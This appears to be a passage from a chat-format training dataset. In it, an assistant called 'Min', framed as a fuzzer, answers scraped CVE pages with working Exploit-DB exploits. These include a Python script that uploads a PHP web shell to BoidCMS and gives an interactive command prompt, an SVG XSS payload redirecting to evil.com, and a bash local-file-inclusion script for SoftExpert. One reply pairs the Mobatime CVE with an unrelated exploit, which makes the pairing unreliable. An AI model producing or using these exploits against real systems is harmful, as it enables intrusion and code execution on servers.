\nAll reactions\n👍\n1 reaction\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nCollaborator\n\nshoaiyb\n      \n\n      commented\n        Jul 14, 2023\n\nYeah, the extension checking will also fix that.\nAnyway, below are the extension to be whitelisted:\navi\navif\ncss\ndoc\ndocx\nflv\ngif\nhtm\nhtml\nico\njpeg\njpg\nkdbx\nm4a\nmkv\nmov\nmp3\nmp4\nmpg\nods\nodt\nogg\nogv\npdf\npng\nppt\npptx\npsd\nrar\nsvg\ntxt\nxls\nxlsx\nwebm\nwebp\nwmv\nzip\n\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\nshoaiyb \n\n      added a commit\n      that referenced\n      this issue\n\n    \nJul 14, 2023\n\n \n\nFix to VUL: #27 by @1337kid\n6a2eb22\nshoaiyb\n        added\n  the \n\n  dev branch\n\nAvailable in the development branch (ready for testing and review)\n label\n    Jul 14, 2023\nshoaiyb\n            self-assigned this\n    Jul 14, 2023\n\n \n      \n            Copy link\n\n \n \nAuthor\n\n1337kid\n      \n\n      commented\n        Jul 15, 2023\n\nThe whitelist looks clean. 👍\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\nshoaiyb\n\n        linked a pull request\n        Jul 15, 2023\n        that will\n        close\n        this issue\n      v2.0.0\n      #17\n \n Merged\nshoaiyb\n\n      removed a link to a pull request\n      Jul 15, 2023\n      v2.0.0\n      #17\n \n Merged\n\nshoaiyb\n          closed this as completed\nJul 15, 2023\nshoaiyb\n\n        linked a pull request\n        Jul 15, 2023\n        that will\n        close\n        this issue\n      Fix for vulnerability #27 implemented\n      #28\n \n Merged\nshoaiyb \n\n      added a commit\n      that referenced\n      this issue\n\n    \nJul 15, 2023\n\n \n\nFix for vulnerability #27 implemented (#28)\n…\n\n2519f20\n\n* Fix to VUL: #27 by @1337kid\n\n* Extensive fix for file upload vulnerability\n\nshoaiyb\n        added\n  the \n\n  fixed\n\nThis issue has been resolved\n label\n    Jul 15, 2023\n\njheysel-r7\n\n    mentioned this issue\n    \nFeb 22, 2024\n\n      Add module for BoidCMS Authenticated RCE CVE-2023-38836\n      rapid7/metasploit-framework#18827\n \n Merged\n6 tasks\n\n \n\nSign up for free\nto join this conversation on GitHub.\n    Already have an account?\n    Sign in to comment\n \n\n    Assignees\n  \n\n \nshoaiyb\n \n    Labels\n  \nbug\n\nSomething isn't working\n\ndev branch\n\nAvailable in the development branch (ready for testing and review)\n\nfixed\n\nThis issue has been resolved\n\nhelp wanted\n\nExtra attention is needed\n\nhigh priority\n\nThe issue or pull request requires immediate attention\n\nin progress\n\nWork is currently underway on the issue or pull request\n\n    Projects\n  \n\n    None yet\n \n\n    Milestone\n  \n\n      No milestone\n    Development\n  \nSuccessfully merging a pull request may close this issue.\n \n      Fix for vulnerability #27 implemented\n\n \n      BoidCMS/BoidCMS\n    \n\n \n      2 participants\n    \n\n \n\n \n \nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsFile Upload vulnerability in BoidCMS v.2.0.0 allows a remote attacker to execute arbitrary code by adding a GIF header to bypass MIME type checks.\n\nexploit\n/php/webapps/51741.py\n#!/usr/bin/python3\n# Exploit Title: BoidCMS v2.0.0 - authenticated file upload vulnerability\n# Date: 08/21/2023\n# Exploit Author: 1337kid\n# Vendor Homepage: https://boidcms.github.io/#/\n# Software Link: https://boidcms.github.io/BoidCMS.zip\n# Version: <= 2.0.0\n# Tested on: Ubuntu\n# CVE : CVE-2023-38836\n\nimport requests\nimport re\nimport argparse\n\nparser = argparse.ArgumentParser(description='Exploit for CVE-2023-38836')\nparser.add_argument(\"-u\", \"--url\", help=\"website url\")\nparser.add_argument(\"-l\", \"--user\", help=\"admin username\")\nparser.add_argument(\"-p\", \"--passwd\", help=\"admin password\")\nargs = parser.parse_args()\nbase_url=args.url\nuser=args.user\npasswd=args.passwd\n\ndef showhelp():\n\tprint(parser.print_help())\n\texit()\nif base_url == None: showhelp()\nelif user == None: showhelp()\nelif passwd == None: showhelp()\n\nwith requests.Session() as s:\n\treq=s.get(f'{base_url}/admin')\n\ttoken=re.findall('[a-z0-9]{64}',req.text)\n\tform_login_data={\n\t\t\"username\":user,\n\t\t\"password\":passwd,\n\t\t\"login\":\"Login\",\n\t}\n\tform_login_data['token']=token\n\ts.post(f'{base_url}/admin',data=form_login_data)\n\t#=========== File upload to RCE\n\treq=s.get(f'{base_url}/admin?page=media')\n\ttoken=re.findall('[a-z0-9]{64}',req.text)\n\tform_upld_data={\n\t\t\"token\":token,\n\t\t\"upload\":\"Upload\"\n\t}\n\t#==== php shell\n\tphp_code=['GIF89a;\\n','<?php system($_GET[\"cmd\"]) ?>']\n\twith open('shell.php','w') as f:\n\t\tf.writelines(php_code)\n\t#====\n\tfile = {'file' : open('shell.php','rb')}\n\ts.post(f'{base_url}/admin?page=media',files=file,data=form_upld_data)\n\treq=s.get(f'{base_url}/media/shell.php')\n\tif req.status_code == '404':\n\t\tprint(\"Upload failed\")\n\t\texit()\n\tprint(f'Shell uploaded to \"{base_url}/media/shell.php\"')\n\twhile 1:\n\t\tcmd=input(\"cmd >> \")\n\t\tif cmd=='exit': exit()\n\t\treq=s.get(f'{base_url}/media/shell.php',params = {\"cmd\": cmd})\n\t\tprint(req.text)\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/Raj789-sec/CVE-2023-39115\n\nGitHub - Raj789-sec/CVE-2023-39115: Campcodes Online Matrimonial Website System 3.3 Cross Site Scripting\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        Raj789-sec\n \n/\n\nCVE-2023-39115\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    0\n \n          Star\n 0\n  \n        Campcodes Online Matrimonial Website System 3.3 Cross Site Scripting\n      \n\n0\n          stars\n \n\n0\n          forks\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nRaj789-sec/CVE-2023-39115\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History9 CommitsAttack-Vector & PoCAttack-Vector & PoC  README.mdREADME.md  View all filesRepository files navigationREADMECVE-2023-39115\nDescription:\nCampcodes Online Matrimonial Website System Script v3.3 is vulnerable to an arbitrary file upload vulnerability, potentially allowing attackers to execute arbitrary code on the targeted server. The vulnerability arises from insufficient validation of uploaded files, particularly SVG (Scalable Vector Graphics) files. By exploiting this vulnerability, an attacker can upload a specially crafted SVG file containing malicious code.\nAttack Vector:\nAn attacker can exploit this vulnerability by crafting an SVG file that includes malicious script code, which is executed when the SVG file is processed by the application's upload functionality.\nImpact:\nSuccessful exploitation of this vulnerability could lead to arbitrary code execution on the server. This could allow the attacker to take control of the application and potentially the entire server, leading to data breaches, unauthorized access, and further attacks on the underlying infrastructure.\nAffected Versions:\nCampcodes Online Matrimonial Website System Script v3.3 is confirmed to be affected by this vulnerability. Other versions might also be vulnerable, but this version has been specifically identified.\nMitigation:\nTo mitigate this vulnerability, the vendor should implement thorough input validation and file type verification checks for uploaded files. Additionally, users are advised to update to a patched version of the software as soon as it becomes available.\n   \nAbout\n\n        Campcodes Online Matrimonial Website System 3.3 Cross Site Scripting\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n0\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n0\n      forks\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsinstall/aiz-uploader/upload in Campcodes Online Matrimonial Website System Script 3.3 allows XSS via a crafted SVG document.\n\nexploit\n/php/webapps/51656.txt\n# Exploit Title: Online Matrimonial Website System v3.3 - Code Execution via malicious SVG file upload\n# Date: 3-8-2023\n# Category: Web Application\n# Exploit Author: Rajdip Dey Sarkar\n# Version: 3.3\n# Tested on: Windows/Kali\n# CVE: CVE-2023-39115\n\n\n\nDescription:\n----------------\n\nAn arbitrary file upload vulnerability in Campcodes Online Matrimonial\nWebsite System Script v3.3 allows attackers to execute arbitrary code via\nuploading a crafted SVG file.\n\n\nSVG Payload\n------------------\n\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"\nhttp://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n   <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\"\nstroke=\"#004400\"/>\n   <script type=\"text/javascript\">\n      alert(\"You have been hacked!!\")\n\n\n      window.location.href=\"https://evil.com\"\n   </script>\n</svg>\n\n\nSteps to reproduce\n--------------------------\n\n -Login with your creds\n -Navigate to this directory - /profile-settings\n -Click on Gallery -> Add New Image -> Browser -> Add Files\n -Choose the SVG file and upload done\n -Click the image!! Payload Triggered\n\n\nBurp Request\n-------------------\n\nPOST /Matrimonial%20Script/install/aiz-uploader/upload HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)\nGecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-TOKEN: I5gqfipOOKWwI74hfdtFC2kpUP0EggWb8Qf7Xd5E\nContent-Type: multipart/form-data;\nboundary=---------------------------167707198418121100152548123485\nContent-Length: 1044\nOrigin: http://localhost\nConnection: close\nReferer: http://localhost/Matrimonial%20Script/install/gallery-image/create\nCookie: _session=5GnMKaOhppEZivuzZJFXQLdldLMXecD1hmcEPWjg;\nacceptCookies=true; XSRF-TOKEN=I5gqfipOOKWwI74hfdtFC2kpUP0EggWb8Qf7Xd5E\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\n-----------------------------167707198418121100152548123485\nContent-Disposition: form-data; name=\"relativePath\"\n\nnull\n-----------------------------167707198418121100152548123485\nContent-Disposition: form-data; name=\"name\"\n\nfile (1).svg\n-----------------------------167707198418121100152548123485\nContent-Disposition: form-data; name=\"type\"\n\nimage/svg+xml\n-----------------------------167707198418121100152548123485\nContent-Disposition: form-data; name=\"aiz_file\"; filename=\"file (1).svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"\nhttp://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n   <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\"\nstroke=\"#004400\"/>\n   <script type=\"text/javascript\">\n      alert(\"You have been hacked!!\")\n\n\n      window.location.href=\"https://evil.com\"\n   </script>\n</svg>\n-----------------------------167707198418121100152548123485--\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://borelenzo.github.io/stuff/2023/06/01/cve-2023-3033.html\nCVE-2023-3033 - Testeur de stylos\nSkip links\n\nSkip to primary navigation\nSkip to content\nSkip to footer\n\n          Testeur de stylos\n          \n        \n\nResearch\n\nMutants\n\nMalwares\n\nAndroid Accessibility Service\n\nAttacking mobile browsers with extensions\nToggle menu\n\nFollow\n\nCVE-2023-3033\nThis walkthrough presents another vulnerability discovered on the Mobatime web application (see CVE-2023-3032, same version 06.7.2022 affected). This vulnerability allows an authenticated user to impersonate another one, possibly having more privileges.\nAuthorisation mechanism\nThis application is essentially a single page, and the pieces of information are retrieved through AJAX calls. To get adequate pieces of information, the requests carry the user identifier, in order to fetch data related to them. The issue is that this identifier is controlled by the user, and the request body is not protected. It is therefore possible to change this identifier, and impersonate someone else.\nA typical AJAX call is as follows:\nPOST /Webengine/api/ajax_api.aspx HTTP/1.1 Accept: */*\nAccept-Encoding: gzip, deflate, br\n... snipped ...\nSec-GPC: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0\nSafari/537.36 X-Requested-With: XMLHttpRequest\n\n@64eyJhcnJheV9pbnQiOltdLCJmdW5jdGlvbiI6NTA3LCJpcGFyYW0xIjoxNTQsImlwYX\nJhbTEwIjowLCJpcGFyYW0xMSI6MCwiaXBhcmFtMTIiOjAsImlwYXJhbTEzIjowLCJpcGF\nyYW0xNCI6MCwiaXBhcmFtMTUiOjAsImlwYXJhbTIiOjg0MTUsImlwYXJhbTMiOjAsImlw\nYXJhbTQiOjAsImlwYXJhbTUiOjAsImlwYXJhbTYiOjAsImlwYXJhbTciOjAsImlwYXJhb\nTgiOjAsImlwYXJhbTkiOjAsImxwYXJhbTEiOjAsInBhcmFtMSI6IiIsInBhcmFtMiI6Ii\nIsInBhcmFtMyI6IiIsInBhcmFtNCI6IiIsInBhcmFtNSI6IiIsInRva2VuIjowfQ==\n\nOne can recognise here a base64-encoded JSON (prefix eyJ), which gives us, once decoded:\n{\n    \"array_int\":[],\n    \"function\":507,\n    \"iparam1\":154,\n    \"iparam10\":0,\n    \"iparam11\":0,\n    \"iparam12\":0,\n    \"iparam13\":0,\n    \"iparam14\":0,\n    \"iparam15\":0,\n    \"iparam2\":8415,\n    \"iparam3\":0,\n    \"iparam4\":0,\n    \"iparam5\":0,\n    \"iparam6\":0,\n    \"iparam7\":0,\n    \"iparam8\":0,\n    \"iparam9\":0,\n    \"lparam1\":0,\n    \"param1\":\"\",\n    \"param2\":\"\",\"\n    param3\":\"\",\n    \"param4\":\"\",\n    \"param5\":\"\",\n    \"token\":0\n}\n\nNow, let’s assume that our ID is 154, and that we want to impersonate 155. Keen eye may see that the payload is not signed, hence forgeable. Since the application is a single page, it was likely that this value 154 was carried by a JS variable, and that we could change it at a single place. All subsequent AJAX calls would probably embed the modified ID, and make us act as 155.\nHunting the identifier\nAnalysing the traffic reveals that the AJAX requests originate from a call to the routine Get in the file MobaBridge3.js. One can suppose here that this routine probably deals with the JSON payload so as to authenticated the request:\nA breakpoint was therefore put at line 1’316, before the function end. Refreshing the page reveals that the attribute this._param holds the value 154. It comes from the second argument (param). Since the value 154 was already known there, one can step over LaunchThread to get back to the calling routine ($ctor1).\n\nIn this routine, a call to Get is indeed performed, and the second argument containing the identifier is referred to as s. The variable s is obtained thanks to a call to JsonConvert.SerializeObject, hence was likely to be built based on the variable function (line 17). The latter is passed as argument (line 13), and to analyse it, one should once again climb up the calling stack.\n\nThe caller lies in the class MensualView.cs, where the func variable is initialised (passed as function in the callee). It is worth noting that one of the attributes of func is named iparam1, just like the attribute carrying the identifier in the JSON stream. Its value is held by the attribute Workflow.pid. By looking where such variable is set thanks to a regular expression, only two results are returned. One of them lies on the class LoginLinkWorkflow.cs\n\nBy putting a breakpoint at line 139 and refreshing the page, the breakpoint is hit. The value of the variable PId could be turned into 155, and letting the execution flow continue normally, and the page would be rendered as if we were 155.\nConclusion\nSince only the advertised identifier seems to be used to verify the authorisations, a malicious user could trick the application into thinking that they are someone else by changing their ID on the client side. Since the server trusts this ID, they would serve inappropriate content. The server should use server-side variables to store the ID of a user, based on a session identifier. An alternative could make use of signed JWTs to make them inalterable.\n\n2024 3\n2023 13\n2020 12\n2024\nExploiting CVE-2024-29889 and CVE-2024-31456\n \n  6 minute read\nIntro\n\nExploiting CVE-2024-27096\n \n  7 minute read\nIntro\nA few weeks ago, I discovered during an intrusion test two vulnerabilities affecting GLPI 10.0.12, that was the latest public version at this time. The...\n\nCVE-2024-27937 - CVE-2024-27930 - Walkthrough\n \n  8 minute read\nI was recently tasked with auditing the application GLPI, a few days after its latest release (10.0.12 at the time of writing). The latter stands for Gestion...\n\nBack to Top ↑\n2023\nFrom SSRF to authentication bypass\n \n  4 minute read\nI won’t insult you by explaining once again what JSON Web Tokens (JWTs) are, and how to attack them. A plethora of awesome articles exists on the Web, descri...\n\nHidden in plain sight - Part 2\n \n  10 minute read\nA few days ago, I published a blog post about PHP webshells, ending with a discussion about filters evasion by getting rid of the pattern $_. The latter is c...\n\nHidden in plain sight\n \n  12 minute read\nA few thoughts about PHP webshells …\n\nTiny File Manager - There’s no place like home\n \n  1 minute read\nI remember this carpet, at the entrance of the Computer Science faculty, with this message There’s no place like 127.0.0.1/8. A joke that would create two ca...\n\nI want to talk to your managed code\n \n  12 minute read\nTL;DR\nA few experiments about mixed managed/unmanaged assemblies. To begin with, we start by presenting a C# programme that hides a part of its payload in an...\n\nQakbot JScript dropper analysis\n \n  11 minute read\nIt was a sunny and warm summer afternoon, and while normal people would rush to the beach, I decided to devote myself to one of my favourite activities: suff...\n\nCVE-2023-3064, CVE-2023-3065, and CVE-2023-3066\n \n  3 minute read\nThe reader should first take a look at the articles related to CVE-2023-3032 and CVE-2023-3033 that I published a few days ago to get more context.\n\nCVE-2023-3033\n \n  3 minute read\nThis walkthrough presents another vulnerability discovered on the Mobatime web application (see CVE-2023-3032, same version 06.7.2022 affected). This vulnera...\n\nCVE-2023-3032\n \n  less than 1 minute read\nMobatime offers various time-related products, such as check-in solutions. In versions up to 06.7.2022, an arbitrary file upload allowed an authenticated use...\n\nCVE-2023-3031\n \n  less than 1 minute read\nKing-Avis is a Prestashop module developed by Webbax. In versions older than 17.3.15, the latter suffers from an authenticated path traversal, leading to loc...\n\nFuckFastCGI made simpler\n \n  3 minute read\nLet’s render unto Caesar the things that are Caesar’s, the exploit FuckFastCGI is not mine and is a brilliant one, bypassing open_basedir and disable_functio...\n\nPHP .user.ini risks\n \n  7 minute read\nI have to admit, PHP is not my favourite, but such powerful language sometimes really amazes me. Two days ago, I found a bypass of the directive open_basedir...\n\nPHP open_basedir bypass\n \n  3 minute read\nPHP is a really powerful language, and as a wise man once said, with great power comes great responsibilities. There is nothing more frustrating than obtaini...\n\nBack to Top ↑\n2020\nSelf modifying C program - Polymorphic\n \n  17 minute read\nA few weeks ago, a good friend of mine asked me if it was possible to create such a program, as it could modify itself. After some thoughts, I answered that ...\n\nSelf modifying C program - Metamorphic (Basic)\n \n  16 minute read\nIn the previous article, I described how I wrote a simple polymorphic program. “Polymorphic” means that the program (the binary) changes its appearance every...\n\nDiving into Viking Horde - Android malware analysis\n \n  4 minute read\nThe malware presented in this blog post appeared on Google Play in 2016. I heard about it thanks to this article published on checkpoint.com.\nThe malicious a...\n\nDiving into SLocker - Android malware analysis\n \n  7 minute read\nRansomwares are really interesting malwares because of their very specific purpose. Indeed, a ransomware will not necessarily try to be stealth or persistent...\n\nDiving into Sberbank Android banker - Android malware analysis\n \n  5 minute read\nA few days ago, I found this article about a malware targeting Sberbank,\na big Russian bank. The app disguises itself as a web application, stealing in backg...\n\nDiving into ruMMS - Android malware analysis\n \n  6 minute read\nRuMMS is a malware targetting Russian users, distributed via websites as a file named mms.apk [1]. This article is inspired by this analysis made by FireEye\n...\n\nDiving into dsencrypt - Android malware analysis\n \n  10 minute read\nCould a 5-classes Android app be so harmful ? dsencrypt says “yes”…\n\nAttacking Android Accessibility Service (AAS) - Part IV\n \n  3 minute read\n~$ cat How_an_Android_app_could_escalate_its_privileges_Part4.txt\n\nAttacking Android Accessibility Service (AAS) - Part III\n \n  3 minute read\n~$ cat How_an_Android_app_could_escalate_its_privileges_Part3.txt\n\nAttacking Android Accessibility Service (AAS) - Part II\n \n  5 minute read\n~$ cat How_an_Android_app_could_escalate_its_privileges_Part2.txt\n\nAttacking Android Accessibility Service (AAS) - Part I\n \n  5 minute read\n~$ cat How_an_Android_app_could_escalate_its_privileges.txt\n\nPractical attacks against mobile browsers using extensions\n \n  17 minute read\nEven if the thesis introduces the extensions internals, and analyses the difference between mobile and desktop browsers in terms of likelihood, efficiency an...\n\nBack to Top ↑\n Feed\n© 2024 Borel Enzo. Powered by Jekyll & Minimal Mistakes.\n\n"}, {"role": "assistant", "content": "descriptionsIncorrect Authorization vulnerability in Mobatime web application allows Privilege Escalation, Exploiting Incorrectly Configured Access Control Security Levels.This issue affects Mobatime web application: through 06.7.22.\n\n\n\nexploit\n/php/webapps/51404.sh\n# Exploit Title: SoftExpert (SE) Suite v2.1.3 - Local File Inclusion\n# Date: 27-04-2023\n# Exploit Author: Felipe Alcantara (Filiplain)\n# Vendor Homepage: https://www.softexpert.com/\n# Version: 2.0 < 2.1.3\n# Tested on: Kali Linux\n# CVE : CVE-2023-30330\n# SE Suite versions tested: 2.0.15.31, 2.0.15.115\n\n# https://github.com/Filiplain/LFI-to-RCE-SE-Suite-2.0\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30330\n\n\n#!/bin/bash\n\n# Usage: ./lfi-poc.sh <domain> <username> <password> <File Path>\n\ntarget=$1\nu=$2\np=$3\nfile=$(echo -n \"$4\"|base64 -w 0)\n\nend=\"\\033[0m\\e[0m\"\nred=\"\\e[0;31m\\033[1m\"\nblue=\"\\e[0;34m\\033[1m\"\n\necho -e \"\\n$4 : $file\\n\"\n\necho -e \"${blue}\\nGETTING SESSION COOKIE${end}\"\ncookie=$(curl -i -s -k -X $'POST' \\\n    -H \"Host: $target\" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 213' -H \"Origin: https://$target\" -H \"Referer: https://$target/softexpert/login?page=home\" -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close' \\\n    -b $'language=1; _ga=GA1.3.151610227.1675447324; SEFGLANGUAGE=1; mode=deploy' \\\n    --data-binary \"json=%7B%22AuthenticationParameter%22%3A%7B%22language%22%3A3%2C%22hashGUID%22%3Anull%2C%22domain%22%3A%22%22%2C%22accessType%22%3A%22DESKTOP%22%2C%22login%22%3A%22$u%22%2C%22password%22%3A%22$p%22%7D%7D\" \\\n    \"https://$target/softexpert/selogin\"|grep se-authentication-token |grep \"=\" |cut -d ';' -f 1|sort -u|cut -d \"=\" -f 2)\n\necho \"cookie: $cookie\"\n\nfunction LFI () {\n\ncurl -s -k -X $'POST' \\\n    -H \"Host: $target\" -H \"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\" -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\" -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H \"Origin: https://$target\" -H \"Referer: https://$target/softexpert/workspace?page=home\" -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Te: trailers' -H 'Connection: close' \\\n    -b \"se-authentication-token=$cookie; _ga=GA1.3.151610227.1675447324; SEFGLANGUAGE=1; mode=deploy\" \\\n    --data-binary \"action=4&managerName=lol&managerPath=$file&className=ZG9jX2RvY3VtZW50X2FkdmFuY2VkX2dyb3VwX2ZpbHRlcg%3D%3D&instantiate=false&loadJquery=false\" \\\n    \"https://$target/se/v42300/generic/gn_defaultframe/2.0/defaultframe_filter.php\"\n\n}\n\necho -e \"${blue}\\nExploiting LFI:${end}\"\nLFI\n\nfunction logout () {\ncurl -i -s -k -X $'POST' \\\n    -H \"Host: $target\" -H $'Content-Length: 0' -H $'Sec-Ch-Ua: \\\"Not_A Brand\\\";v=\\\"99\\\", \\\"Google Chrome\\\";v=\\\"109\\\", \\\"Chromium\\\";v=\\\"109\\\"' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'X-Requested-With: XMLHttpRequest' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' -H $'Sec-Ch-Ua-Platform: \\\"Linux\\\"' -H \"Origin: https://$target\" -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H \"Referer: https://$target/softexpert/workspace?page=home\" -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \\\n    -b \"se-authentication-token=$cookie; language=1; _ga=GA1.3.1890963078.1675081150; twk_uuid_5db840c5e4c2fa4b6bd8f89a=%7B%22uuid%22%3A%221.bJmDVb5PBlMumGNq2QO9gxk5hjdc6sp2pgENmao2hxHntg00r0qllmuXqCXTWG9uYLT1GkRDFuPY4ir63UIEJEXSS0pIJi8YlIvsB4edfrG1RTcS3CPr58feQBNf1%22%2C%22version%22%3A3%2C%22domain%22%3A%22$target%22%2C%22ts%22%3A1675081174571%7D; mode=deploy\" \\\n    \"https://$target/softexpert/selogout\"\n}\n\necho -e \"${blue}\\nLogging out${end}\"\nlogout >/dev/null\necho -e \"\\n\\nDone!\"\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/torvalds/linux/commit/1ba5bf993c6a3142e18e68ea6452b347f9cb5635\nxfrm: fix crash in XFRM_MSG_GETSA netlink handler · torvalds/linux@1ba5bf9 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        